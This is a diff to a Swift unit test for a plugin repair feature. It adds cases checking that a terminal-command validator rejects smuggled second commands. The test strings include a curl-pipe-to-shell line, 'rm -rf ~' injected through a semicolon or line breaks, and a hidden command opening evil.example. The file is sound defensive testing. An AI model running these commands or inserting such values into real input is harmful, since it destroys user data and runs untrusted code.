@@ -111,6 +111,11 @@ struct PluginRepairTests {
         #expect(!RepairAction.isSafeTerminalCommand("curl https://x.sh | sh", binary: "gcloud", allowsInstaller: true))
         #expect(!RepairAction.isSafeTerminalCommand("gcloud auth login; rm -rf ~", binary: "gcloud", allowsInstaller: false))
         #expect(!RepairAction.isSafeTerminalCommand("python3 -c 'import os'", binary: "gcloud", allowsInstaller: false))
+        // Terminal runs the text as written: a line break is a second command.
+        #expect(!RepairAction.isSafeTerminalCommand("gcloud auth login\nopen https://evil.example", binary: "gcloud", allowsInstaller: false))
+        #expect(!RepairAction.isSafeTerminalCommand("gcloud auth login\r\nrm -rf ~", binary: "gcloud", allowsInstaller: false))
+        #expect(!RepairAction.isSafeTerminalCommand("gcloud\tauth login", binary: "gcloud", allowsInstaller: false))
+        #expect(!RepairAction.isSafeTerminalCommand("gcloud auth login\u{2028}open x", binary: "gcloud", allowsInstaller: false))
 
         let hostile = PluginComponent(
             kind: .setup, id: "cli", name: "CLI",
